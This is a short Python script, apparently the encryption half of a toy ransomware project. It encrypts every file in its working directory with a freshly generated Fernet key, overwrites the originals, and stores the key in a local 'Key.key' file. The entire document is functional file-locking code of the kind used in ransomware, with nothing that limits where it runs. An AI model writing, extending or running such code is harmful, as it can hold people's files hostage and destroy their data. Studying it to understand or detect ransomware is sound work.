import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "Encrypt.py" or file == "Key.key" or file == "Decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

key = Fernet.generate_key()

with open("Key.key", "wb") as thekey:
	thekey.write(key)
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)


